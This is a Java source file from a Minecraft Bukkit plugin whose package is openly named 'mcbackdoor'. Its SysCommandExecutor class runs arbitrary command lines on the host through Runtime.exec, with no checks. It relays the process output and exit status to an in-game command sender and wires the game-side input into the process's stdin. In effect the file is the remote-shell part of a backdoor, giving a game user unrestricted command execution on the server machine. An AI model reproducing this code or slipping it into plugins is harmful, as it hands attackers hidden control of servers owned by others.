package org.martin.bukkit.mcbackdoor.utils;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;

/**
 * Usage of following class can go as ...
 * <P><PRE><CODE>
 * 		SysCommandExecutor cmdExecutor = new SysCommandExecutor();
 * 		cmdExecutor.setOutputLogDevice(new LogDevice());
 * 		cmdExecutor.setErrorLogDevice(new LogDevice());
 * 		int exitStatus = cmdExecutor.runCommand(commandLine);
 * </CODE></PRE></P>
 * 
 * OR
 * 
 * <P><PRE><CODE>
 * 		SysCommandExecutor cmdExecutor = new SysCommandExecutor(); 		
 * 		int exitStatus = cmdExecutor.runCommand(commandLine);
 * 
 * 		String cmdError = cmdExecutor.getCommandError();
 * 		String cmdOutput = cmdExecutor.getCommandOutput(); 
 * </CODE></PRE></P> 
 *
 * http://www.javalobby.org/java/forums/t53333.html
 * 
 * @author Venkat
 *
 */
public class SysCommandExecutor extends Thread {

    private String fWorkingDirectory = null;
    private List<EnvironmentVar> fEnvironmentVarList = null;
    private StringBuffer fCmdOutput = null;
    private StringBuffer fCmdError = null;
    private AsyncStreamReader fCmdOutputThread = null;
    private AsyncStreamReader fCmdErrorThread = null;
    private String commandLine;
    private CommandSender sender;
    private AsyncCommandSender out;
    private Process process;
    
    public void setWorkingDirectory(String workingDirectory) {
        fWorkingDirectory = workingDirectory;
    }

    public void setEnvironmentVar(String name, String value) {
        if (fEnvironmentVarList == null) {
            fEnvironmentVarList = new ArrayList<EnvironmentVar>();
        }

        fEnvironmentVarList.add(new EnvironmentVar(name, value));
    }

    public String getCommandOutput() {
        return fCmdOutput.toString();
    }

    public String getCommandError() {
        return fCmdError.toString();
    }

    public void runCommand(String commandLine, CommandSender sender, AsyncCommandSender out) {
        this.commandLine = commandLine;
        this.sender = sender;
        this.out = out;
    }

    private Process runCommandHelper(String commandLine) throws IOException {
        Process process = null;
        if (fWorkingDirectory == null) {
            process = Runtime.getRuntime().exec(commandLine, getEnvTokens());
        } else {
            process = Runtime.getRuntime().exec(commandLine, getEnvTokens(), new File(fWorkingDirectory));
        }

        return process;
    }

    private void startOutputAndErrorReadThreads(InputStream processOut, InputStream processErr, CommandSender sender) {
        fCmdOutput = new StringBuffer();
        fCmdOutputThread = new AsyncStreamReader(processOut, fCmdOutput, "OUTPUT", sender);
        fCmdOutputThread.start();

        fCmdError = new StringBuffer();
        fCmdErrorThread = new AsyncStreamReader(processErr, fCmdError, "ERROR", sender);
        fCmdErrorThread.start();
    }

    private void notifyOutputAndErrorReadThreadsToStopReading() {
        fCmdOutputThread.stopReading();
        fCmdErrorThread.stopReading();
    }

    private String[] getEnvTokens() {
        if (fEnvironmentVarList == null) {
            return null;
        }

        String[] envTokenArray = new String[fEnvironmentVarList.size()];
        Iterator<EnvironmentVar> envVarIter = fEnvironmentVarList.iterator();
        int nEnvVarIndex = 0;
        while (envVarIter.hasNext() == true) {
            EnvironmentVar envVar = (EnvironmentVar) (envVarIter.next());
            String envVarToken = envVar.fName + "=" + envVar.fValue;
            envTokenArray[nEnvVarIndex++] = envVarToken;
        }

        return envTokenArray;
    }

    @Override
    public void run() {
        /* run command */
        int exitStatus = -1;
        try {
            process = runCommandHelper(commandLine);

            /* start output and error read threads */
            startOutputAndErrorReadThreads(process.getInputStream(), process.getErrorStream(), sender);
            out.setOutputStream(process.getOutputStream());
            /* wait for command execution to terminate */
            exitStatus = process.waitFor();
            
        } catch (Throwable ex) {
            //throw new Exception(ex.getMessage());
            Logger.getLogger("Minecraft").log(Level.SEVERE, null, ex);
        } finally {
            /* notify output and error read threads to stop reading */
            notifyOutputAndErrorReadThreadsToStopReading();
        }
        sender.sendMessage(ChatColor.DARK_RED + "Exit status: " + exitStatus);
    }

    public synchronized void stopC(){
        process.destroy();
    }

}

/**
 * http://www.javalobby.org/java/forums/t53333.html
 * 
 * @author Venkat
 *
 */
class EnvironmentVar {

    public String fName = null;
    public String fValue = null;

    public EnvironmentVar(String name, String value) {
        fName = name;
        fValue = value;
    }
}
